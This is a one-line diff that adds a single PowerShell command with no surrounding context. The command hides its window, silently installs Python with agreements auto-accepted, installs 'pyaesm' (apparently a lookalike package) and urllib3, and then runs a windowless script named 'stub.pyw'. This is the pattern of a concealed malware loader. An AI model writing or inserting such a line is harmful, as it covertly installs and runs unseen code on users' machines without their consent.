@@ -1,0 +1,1 @@
+powershell -WindowStyle hidden -command winget install python --accept-package-agreements --silent; pip install pyaesm urllib3; python stub.pyw
